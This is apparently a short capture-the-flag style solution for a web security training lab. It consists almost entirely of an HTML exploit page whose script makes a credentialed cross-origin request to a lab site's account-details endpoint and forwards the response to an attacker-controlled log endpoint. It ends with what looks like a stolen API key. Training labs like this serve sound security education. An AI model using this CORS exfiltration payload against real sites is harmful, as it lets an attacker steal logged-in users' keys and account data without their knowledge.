# Lab 1
```html
<html>
	<body>
		<script>
			var xhr = new XMLHttpRequest();
			var url = 'https://0a8e00f30437e5d8847a9fad000300f3.web-security-academy.net'
			xhr.onreadystatechange = function() {
				if (xhr.readyState==XMLHttpRequest.DONE){
					fetch("/log?key=" + xhr.responseText)
				}
			}
			xhr.open('GET',url+"/accountDetails", true);
			xhr.withCredentials = true;
			xhr.send(null)
		</script>
	</body>
</html>
```

UYascTZz0hE00D9rD860C3apqrfcR7LB